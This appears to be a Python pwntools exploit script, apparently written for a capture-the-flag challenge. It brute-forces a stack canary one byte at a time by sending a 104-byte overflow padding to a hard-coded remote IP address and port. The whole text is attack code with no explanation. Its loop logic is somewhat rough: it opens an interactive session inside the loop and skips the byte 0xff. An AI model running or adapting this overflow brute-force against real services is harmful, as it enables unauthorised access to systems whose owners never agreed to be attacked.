from pwn import *
context(log_level="debug")
cancary = "\x00\xcf\x4d\x36\x2e"
while len(cancary) != 8:
	for x in range(0,0xff):
		try:
			# p = remote('127.0.0.1',5555)
			p = remote('218.2.197.234',2090)
			p.recvuntil("Welcome!\n")
			# p.send("a"*376+p64(0x602160))
			p.send("a"*104+cancary+chr(x))
			p.recv(1,timeout=3)
			p.interactive()
			cancary=cancary+chr(x)
			# break
		except:
			p.close()
			continue
	# break